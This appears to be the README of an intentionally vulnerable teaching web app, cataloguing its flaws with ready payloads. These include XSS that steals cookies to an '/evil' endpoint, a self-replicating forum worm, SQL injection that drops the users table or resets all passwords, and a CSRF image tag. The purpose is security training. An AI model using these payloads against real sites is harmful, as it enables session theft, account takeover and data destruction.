# Web Playground
A web application demonstrating web vulnerabilities. Testing XSS, script injection, SQL injection,...

# Known issues

Here is a list of all known voulnarbilities on the site

## Search

1. XSS: When displaying "You searched for <string>" the string is not properly
escaped.
   * Test for XSS: `<script> alert("XSS!") </script>`
   * Change all links: `Facebook <script> $(function(){$("a").attr("href", "/evil");}); </script>`
   * __Steal cookies__: `<script> $.get("/evil?save=cookie&cookie="+encodeURI(document.cookie)); </script>`
2. SQL Injection: SQL query is manually created and not properly escaped.
   * Test shows stack trace and actual code: `'`
   * See all hidden links: `aaa ' OR hide=1 OR hide='`

## Login

1. Remember password: Browser can preload your saved passwords.
   * You can inspect the password input field and change type from `password` to
   `text` and the saved password will be visible.
2. GET: Using GET method instead of POST
   * Everyone can see all the posted data i.e. username and password in the URL
3. CSRF: site does not check for origin of the request
   * You can click a link (or not) and be logged in as someone else
4. __SQL injection: SQL query not properly escaped__
   * Test shows stack trace and actual code: `'`
   * Delete tables: `'); DROP TABLE users;('`
   * Change all passwords: `'); UPDATE users SET password='funfun';`

## Forum

1. GET: Using GET method instead of POST
   * No re-confirmation when reloading a page. You simply re-post.
2. CSRF: site does not check for origin of the request
   * Images can cause damage: `<img src='/forum?action=new&title=XSS&content=imageXSS'/>`
3. XSS: Many things not escaped. Title, content, user's name.
   * Self replicating post:
      ```HTML
      <span class="xss">
          Tekst?
          <script>
              $.get('?action=new&title=XSS&content='+
                    encodeURIComponent($(".xss")[0].outerHTML));
          </script>
      </span>
      Quil?
      <script>
          var prog = "Quil?<script>var prog = @;$.get('?action=new&title=XSS&content='+encodeURIComponent(prog.replace('@', prog)+'t>'));</scrip";
          $.get('?action=new&title=XSS&content='+
                encodeURIComponent(prog.replace('@', prog)+'t>'));
      </script>
      ```
   * __Steal cookies__: `<script> $.get("/evil?save=cookie&cookie="+encodeURI(document.cookie)); </script>`

## Database viewer (/db_viewer_XDSie983BQbnxc_asjdh)

1. URL change: no sanity checks for url parameters
   * Access all data by changing table name in the url
2. Unaythorized access
   * Anyone with a link can access it
